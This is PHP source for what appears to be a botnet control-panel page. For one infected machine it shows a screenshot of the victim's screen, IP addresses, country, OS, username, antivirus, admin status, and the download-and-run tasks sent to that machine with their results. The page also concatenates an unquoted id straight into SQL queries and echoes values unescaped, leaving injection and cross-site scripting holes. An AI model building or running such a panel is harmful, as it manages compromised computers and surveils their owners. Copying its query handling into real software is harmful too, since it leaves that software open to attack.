<?php
      
   session_start();

   error_reporting( 1 );

   if ( !( isset( $_SESSION['Name'] ) ) )
   {
      header( "Location: Login.php" );
      exit;
   }

   function CheckSQL()
   {
      include( "Cfg/Config.php" );
      if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
      {
         echo "SQL connection filed, check host, name, login and password";
         die;
      }
   }

   function GetBG()
   {
      static $e = "0";

      if ( $e == "1" )
      {
         $e = "0";
         return "#E4E9F7";
      }
      
      if ( $e == "0" )
      {
         $e = "1";
         return "#d8dded";
      }
   }

   function GetUnitTaskResult( $id, $tid )
   {
      include( "Cfg/Config.php" );
      include( "Cfg/Lang.php" );

      @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
      mysql_select_db( $conf['dbname'] );
      
      $result = mysql_query( 'SELECT * FROM results WHERE id = ' . $id );

      while ( $row = mysql_fetch_array( $result ) )
      {      
         if( $tid == $row['tid'] )
         {
            $g = $row['res'];
            
            if( $g == 0 )
               return $lang["0147"];

            if( $g == 1 )
               return $lang["0148"];

            if( $g == 2 )
               return $lang["0149"];
         }
      }
   }

   function GetUnitTasks( $id )
   {
      include( "Cfg/Config.php" );
      include( "Cfg/Lang.php" );
   
      $unit = $id;
      $g = "<div align = center> 
               <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
                  <tr height=\"35\">                              
                     <td><div align = center>" . $lang["0052"] . ":</div></td> 
                     <td><div align = center>" . $lang["0053"] . ":</div></td>
                     <td><div align = center>" . $lang["0138"] . ":</div></td>
                     <td><div align = center>" . $lang["0139"] . ":</div></td>
                  </tr>";

      @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
      mysql_select_db( $conf['dbname'] );
      
      $result = mysql_query( 'SELECT * FROM tasks_exec WHERE unitid = ' . $id );

      while ( $row = mysql_fetch_array( $result ) )
      {      
         $tid = $row['task_id'];
         $result_m = mysql_query( 'SELECT * FROM tasks WHERE id = ' . $tid );

         while ( $r = mysql_fetch_array( $result_m ) )
         {      
            $id = $r['id'];

            if ( strpos( $r['path'], ":::" ) )
            {
               $url_1 = substr( $r['path'], 0, strpos( $r['path'], ":::" ) );
               $fnc_1 = " (" . substr( $r['path'], strpos( $r['path'], ":::" ) + 3, 100 ) . ")";
            }  
            else
            {
               $url_1 = $r['path'];
               $fnc_1 = "";
            }

            if ( $r['filetype'] == 0 ) 
               $filetype = $lang["0067"];

            if ( $r['filetype'] == 1 ) 
               $filetype = $lang["0068"];

            if ( $r['filetype'] == 2 )
               $filetype = $lang["0069"];

            if ( $r['filetype'] == 3 ) 
               $filetype = $lang["0068"];

            if ( $r['filetype'] == 4 ) 
               $filetype = $lang["0070"];

            if ( $r['filetype'] == 9 ) 
               $filetype = $lang["0071"];    
      
            $gb = GetBG();

            $g = $g . "<tr height=\"35\">" .
                        "<td bgcolor = " . $gb . ">" . "<div align = left>&nbsp;<img src=\"Images\Ico_Global.png\" width=16 height=16> " . $r['comment'] . "</div></td>" .
                        "<td bgcolor = " . $gb . ">" . "<div align = left>" . "<a href=\"" . $url_1 . "\">" . $url_1 . "</a>" .  " " . $fnc_1 . "</div>" . "</td>" .
                        "<td bgcolor = " . $gb . ">" . "<img src=\"Images\Ico_Task.png\" width=16 height=16> " . $filetype . "</td>" .
                        "<td bgcolor = " . $gb . ">" . "<img src=\"Images\Ico_Task.png\" width=16 height=16> " . GetUnitTaskResult( $unit, $id ) . "</td>" .
                     "</tr>";
         }
      }

      $g = $g . "   </table>
            </div>";

      mysql_close();
      return $g;
   }

   function GetUnitTasksCount( $id )
   {
      include( "Cfg/Config.php" );
      @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
      mysql_select_db( $conf['dbname'] );
      
      $result = mysql_query( 'SELECT * FROM tasks_exec WHERE unitid = ' . $id );
      mysql_close();
      return mysql_num_rows( $result );
   }

   function GetUnitData( $id, $data )
   {
      include( "Cfg/Config.php" );
      @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
      mysql_select_db( $conf['dbname'] );
      
      $result = mysql_query( 'SELECT * FROM units WHERE id = ' . $id );
      mysql_close();

      $row = mysql_fetch_array( $result );
      return $row[$data];
   }

   function sTable()
   {
      echo "<table border=\"0\" width=\"98%\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
            <tr><td></td></tr>
            </table>";
   }

   function strfix( $str )
   {
      return str_replace( "'", "", $str );
   }

   include( "Header.php" );

   CheckSQL();

   $i = strfix( $_GET['id'] );

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 1px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $lang["0140"]  . $i . " " . $lang["0141"] .
                  "</font>
               </div>
            </td>
         </tr>
      </table>";

   sTable();

   if ( ( file_exists( 'Screen/' . $i . '.jpg' ) ) || ( file_exists( 'Screen\\' . $i . '.jpg' ) ) )
   {   
      echo "<div align = center> <a href=Screen\\" . $i . ".jpg> <img src=\"Screen\\" . $i . ".jpg\" width=1200 height=675> </a> </div>";    
   }

   echo "<div align = center> 
            <table cellpadding=1 cellspacing=1 width=\"98%\" class=table style =\"border: 1px solid;\">
               <tr height=\"35\">                      
                  <td><div align = left>&nbsp;" . $lang["0001"] . ":</div></td>
                  <td><div align = center>" . $lang["0002"] . ":</div></td>              
               </tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0142"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . $i . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0021"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'sid' ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0143"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'ip' ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0144"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'first_ip' ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0014"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'country' ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0026"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData( $i, 'version' ) . "</b></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0019"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'os' ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0018"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'arch' ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0017"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'ar' ) . "</td></tr>";
   
   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0027"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData( $i, 'dm' ) . "</b></td></tr>";    

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0028"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData( $i, 'pc' ) . "</b></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0029"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitData( $i, 'un' ) . "</b></td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0020"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . GetUnitData( $i, 'av' ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0145"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . date( "d|m|Y H:i", ( GetUnitData( $i, 'reg' ) ) ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0031"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . ">" . date( "d|m|Y H:i", ( GetUnitData( $i, 'online' ) ) ) . "</td></tr>";

   $gb = GetBG();
   echo "<tr height=\"35\"><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\"> " . $lang["0146"] . ":" . "</td>"; 
   echo "    <td width=200 bgcolor ="  . $gb . "><b>" . GetUnitTasksCount( $i ) . "</b></td></tr>";

   sTable();
   echo GetUnitTasks( $i );
   sTable();

   include( "Footer.php" );
?> 